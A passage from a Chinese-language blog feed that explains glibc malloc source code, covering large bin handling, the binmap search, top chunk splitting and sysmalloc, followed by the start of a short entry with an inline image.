<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) fwd-&gt;size)</span><br><span class="line">                   <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                   fwd = fwd-&gt;fd;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                   &#123;</span><br><span class="line">                     victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                     victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                     fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                     victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                   &#125;</span><br><span class="line">                 bck = fwd-&gt;bk;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>正向遍历chunk size链表，找到一个和当前chunk大小相同的chunk就退出，那么chunk size 链表中一定包含fwd 所指向的chunk，为了不修改chunk size 链表，当前chunk 只能插入fwd 之后。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果large bin链表里没有chunk，那么就直接插入chunk size链表。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mark_bin (av, victim_index);</span><br><span class="line">       victim-&gt;bk = bck;</span><br><span class="line">       victim-&gt;fd = fwd;</span><br><span class="line">       fwd-&gt;bk = victim;</span><br><span class="line">       bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>

<p>完成chunk的插入空闲链表之后，设置bitmap。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line">          <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>这里设置了最大的迭代次数，超出就直接退出了。</p>
<p>​    当将unsorted bin 中的空闲chunk 加入到相应的small bins 和large bins 后，将使用最佳匹配法分配large bin chunk。源代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If a large request, scan through the chunks of current bin in</span></span><br><span class="line"><span class="comment">   sorted order to find smallest that fits.  Use the skip list for this.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">  &#123;</span><br><span class="line">    bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">    <span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;</span><br><span class="line">        (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (victim-&gt;size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))</span><br><span class="line">      &#123;</span><br><span class="line">        victim = victim-&gt;bk_nextsize;</span><br><span class="line">        <span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb)))</span><br><span class="line">          victim = victim-&gt;bk_nextsize;</span><br></pre></td></tr></table></figure>

<p>​    如果所分配的块是large bin chunk，那么进入这段逻辑，当large bin list不为空且最大的chunk可以满足需要，就反向遍历链表，找到大小最合适的chunk，然后退出循环。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">              list does not have to be rerouted.  */</span></span><br><span class="line">           <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">             victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">           remainder_size = size - nb;</span><br><span class="line">           unlink (av, victim, bck, fwd);</span><br></pre></td></tr></table></figure>

<p>​    如果所选的chunk(即victim)不是最后一个chunk，且下一个块chunk大小和所选的chunk大小一致，那么把后面的那个chunk作为备选。</p>
<p>​    计算victim分割后剩余的size，然后使用<code>unlink()</code>宏去把victim从链表中取出来。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Exhaust */</span></span><br><span class="line">          <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>​    之后判断分割后剩余大小，如果小于MINSIZE(分配的chunk要略大于需要的chunk)，那么就给victim设置inuse标志，然后根据是否是主分配区的判断，设置相应的标志位。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">           <span class="comment">/* Split */</span></span><br><span class="line">           <span class="keyword">else</span></span><br><span class="line">             &#123;</span><br><span class="line">               remainder = chunk_at_offset (victim, nb);</span><br><span class="line">               <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                  have to perform a complete insert here.  */</span></span><br><span class="line">               bck = unsorted_chunks (av);</span><br><span class="line">               fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                 &#123;</span><br><span class="line">                   errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">                   <span class="keyword">goto</span> errout;</span><br><span class="line">                 &#125;</span><br><span class="line">               remainder-&gt;bk = bck;</span><br><span class="line">               remainder-&gt;fd = fwd;</span><br><span class="line">               bck-&gt;fd = remainder;</span><br><span class="line">               fwd-&gt;bk = remainder;</span><br><span class="line">               <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                 &#123;</span><br><span class="line">                   remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                   remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">               set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                         (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">               set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">               set_foot (remainder, remainder_size);</span><br><span class="line">             &#125;</span><br><span class="line">           check_malloced_chunk (av, victim, nb);</span><br><span class="line">           <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">           alloc_perturb (p, bytes);</span><br><span class="line">           <span class="keyword">return</span> p;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>

<p>​    从victim中分割出去的剩余部分作为新chunk加入到unsorted bin中，接着是判断大小，如果是large bin的范围，还要把<code>fd_nextsize</code>和<code>bk_nextsize</code>置为NULL，之后设置标志位，因为remainder空闲，所以还要设置foot(上面的分析里也有类似这段设置标志位的逻辑)。最后就很简单了，调用<code>chunk2mem()</code>的到可用的内存指针并返回给用户。</p>
<p>​    上面从最合适的small bin和large bin都没有合适的chunk去分配，那么就会查看比当前index大的下一个small bin 或者large bin中有没有合适的块去分配给用户，源码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">        Search for a chunk by scanning bins, starting with next largest</span></span><br><span class="line"><span class="comment">        bin. This search is strictly by best-fit; i.e., the smallest</span></span><br><span class="line"><span class="comment">        (with ties going to approximately the least recently used) chunk</span></span><br><span class="line"><span class="comment">        that fits is selected.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        The bitmap avoids needing to check that most blocks are nonempty.</span></span><br><span class="line"><span class="comment">        The particular case of skipping all bins during warm-up phases</span></span><br><span class="line"><span class="comment">        when no chunks have been returned yet is faster than it might look.</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line"></span><br><span class="line">     ++idx;</span><br><span class="line">     bin = bin_at (av, idx);</span><br><span class="line">     block = idx2block (idx);</span><br><span class="line">     <span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">     bit = idx2bit (idx);</span><br></pre></td></tr></table></figure>

<p>​    首先获取下一个bin，下面是<code>malloc_state</code>的结构体，bitmap是标识对应的bin中有没有空闲chunk。bitmap是按照block管理的，所以先获取了block，然后根据获取到的block去获取bitmap。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  <span class="keyword">mutex_t</span> mutex;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="keyword">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top; <span class="comment">//point to the TOP CHUNK of malloc state -- by muhe</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>​    bit通过下面的宏被设置，idx指定的位置为1，其他位为0 。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> idx2bit(i)       ((1U &lt;&lt; ((i) &amp; ((1U &lt;&lt; BINMAPSHIFT) - 1))))</span></span><br></pre></td></tr></table></figure>

<p>​    如果bit大于map，则map为0，map为0，说明当前bin中没有空闲chunk，所以去遍历bitmap的下一个block，直到找到一个不为0，或者遍历完才结束。</p>
<p>​    在退出循环遍历后，设置bin 指向block 的第一个bit 对应的bin，并将bit 为1，    表示该block中bit 1 对应的bin，这个bin 中如果有空闲chunk，该chunk 的大小一定满足要求。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BINMAPSHIFT      5</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">       &#123;</span><br><span class="line">         <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">         <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="keyword">do</span></span><br><span class="line">               &#123;</span><br><span class="line">                 <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">                   <span class="keyword">goto</span> use_top;			<span class="comment">//走top chunk的逻辑</span></span><br><span class="line">               &#125;</span><br><span class="line">             <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>); <span class="comment">//取到下一个block的map</span></span><br><span class="line"></span><br><span class="line">             bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">             bit = <span class="number">1</span>;</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure>

<p>​    这段逻辑，是遍历一个block里所有的bin，因为map是非0的，所以找到bit不为0就退出循环，那么这个bit对应bin中一定有空闲chunk。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line">        <span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>)</span><br><span class="line">          &#123;</span><br><span class="line">            bin = next_bin (bin);</span><br><span class="line">            bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">            assert (bit != <span class="number">0</span>);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​    获取这个bin的最后一个chunk即victim，如果最后一个chunk和链表头指针相同，那么说明这个链表中没有空chunk，这个时候就先把之前bit清零，然后到下一个bin中，</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line">        victim = last (bin);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line">        <span class="keyword">if</span> (victim == bin)</span><br><span class="line">          &#123;</span><br><span class="line">            av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">            bin = next_bin (bin);</span><br><span class="line">            bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure>

<p>​    如果不相同，那么先的到victim的size，然后和之前的逻辑类似，计算分割后的大小remainder_size，然后使用unlink宏去把victim从链表中解链出来。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">            assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb));</span><br><span class="line"></span><br><span class="line">            remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* unlink */</span></span><br><span class="line">            unlink (av, victim, bck, fwd);</span><br></pre></td></tr></table></figure>

<p>​    这里判断切割后的大小并针对不同的大小做不同的处理。</p>
<ol>
<li>如果切割剩余大小比MINSIZE小，那么就应该把整个chunk分给用户，之后就设置对应的标志位，之后就是返回的工作了；</li>
<li>如果比MINSIZE大，就要分割了。分割剩下的这块，要作为新的chunk加入unsorted bin。</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Exhaust */</span></span><br><span class="line">           <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">             &#123;</span><br><span class="line">               set_inuse_bit_at_offset (victim, size);</span><br><span class="line">               <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                 victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">             &#125;</span><br><span class="line"></span><br><span class="line">           <span class="comment">/* Split */</span></span><br><span class="line">           <span class="keyword">else</span></span><br><span class="line">             &#123;</span><br><span class="line">               remainder = chunk_at_offset (victim, nb);</span><br><span class="line"></span><br><span class="line">               <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                  have to perform a complete insert here.  */</span></span><br><span class="line">               bck = unsorted_chunks (av);</span><br><span class="line">               fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                 &#123;</span><br><span class="line">                   errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;</span><br><span class="line">                   <span class="keyword">goto</span> errout;</span><br><span class="line">                 &#125;</span><br><span class="line">               <span class="comment">//添加到第一个位置</span></span><br><span class="line">               remainder-&gt;bk = bck;</span><br><span class="line">               remainder-&gt;fd = fwd;</span><br><span class="line">               bck-&gt;fd = remainder;</span><br><span class="line">               fwd-&gt;bk = remainder;</span><br></pre></td></tr></table></figure>

<p>​    如果整个剩余的chunk是small bin，那么就要把分配区的last remainder 设置为这个chunk；如果是large bin，要把<code>fd_nextsize</code>和<code>bk_nextsize</code>置NULL，然后和之前对large bin处理的逻辑一样，设置head、foot的标志位。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* advertise as last remainder */</span></span><br><span class="line">               <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">                 av-&gt;last_remainder = remainder;</span><br><span class="line">               <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                 &#123;</span><br><span class="line">                   remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                   remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">               set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                         (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">               set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">               set_foot (remainder, remainder_size);</span><br><span class="line">             &#125;</span><br><span class="line">           </span><br></pre></td></tr></table></figure>

<p>​    最后逻辑很简单，调用<code>chunk2mem</code>的到可用的内存指针，并返回给用户。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">check_malloced_chunk (av, victim, nb);</span><br><span class="line">           <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">           alloc_perturb (p, bytes);</span><br><span class="line">           <span class="keyword">return</span> p;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>



<h6 id="5-top-chunk"><a href="#5-top-chunk" class="headerlink" title="5.top chunk"></a>5.top chunk</h6><p>​    这部分是在前面所有分配都失败的情况下才会到的逻辑，即fastbin 、small bin、large bin 都没有分配到所需要的chunk，就会从当前分配实例的top chunk直接分配内存，代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">use_top:</span><br><span class="line">     <span class="comment">/*</span></span><br><span class="line"><span class="comment">        If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">        (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">        search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">        less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">        be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">        limitations).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">        MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">        exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">        reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">        to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line"></span><br><span class="line">     victim = av-&gt;top;</span><br><span class="line">     size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">       &#123;</span><br><span class="line">         remainder_size = size - nb;</span><br><span class="line">         remainder = chunk_at_offset (victim, nb);</span><br><span class="line">         av-&gt;top = remainder;</span><br><span class="line">         set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                   (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">         set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">         check_malloced_chunk (av, victim, nb);</span><br><span class="line">         <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">         alloc_perturb (p, bytes);</span><br><span class="line">         <span class="keyword">return</span> p;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​    首先，获取到top chunk，然后获取top chunk的size，接着判断size和要分配的大小nb，如果size大于我们要分配的大小nb，那就直接从top chunk中分割，的到victim，分割剩余部分作为新的top chunk，设置victim的一些标志位之后，调用<code>chunk2mem()</code>的到可用内存指针并且返回给用户。</p>
<p>​    一点小细节，因为top chunk需要MINSIZE 的空间来作为fencepost，所以大小比较的时候要加个MINSIZE；所以在分割完成之后并不用去设置foot。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">   here for all block sizes.  */</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">  &#123;</span><br><span class="line">    malloc_consolidate (av);</span><br><span class="line">    <span class="comment">/* restore original bin index */</span></span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>​    如果还是没从top chunk中分配到，判断当前分配区中是否有fast bins中是否有chunk，有的话就合并到unsorted bin中，接着判断，在small bin范围内，就再次设置idx，进到最外层循环，再来一次，相对应的，large bin范围内也是一样，设置idx，再到最外层循环。</p>
<h6 id="6-sysmalloc"><a href="#6-sysmalloc" class="headerlink" title="6.sysmalloc"></a>6.sysmalloc</h6><p>​    在之前的分配策略都没办法分配到我们想要的内存的时候，就会走到这里。这里直接调用了<code>sycmalloc()</code>去分配，其实就是使用了<code>mmap()</code>直接映射，当然这个函数不可能这么简单，他对不同情况做了不同的处理。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">          <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="2-sysmalloc-分析"><a href="#2-sysmalloc-分析" class="headerlink" title="2. sysmalloc 分析"></a>2. sysmalloc 分析</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> * </span><br><span class="line">  sysmalloc (INTERNAL_SIZE_T nb, mstate av)</span><br></pre></td></tr></table></figure>






<pre><code>为了治疗拖延症，所以把过程记录在博客上，慢慢更新...</code></pre>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>glibc内存管理</tag>
      </tags>
  </entry>
  <entry>
    <title>NULL</title>
    <url>/2019/04/17/NULL/</url>
    <content><![CDATA[<p>希望不是幻觉</p>
<a id="more"></a>



<p><img src="data:image/png;base64,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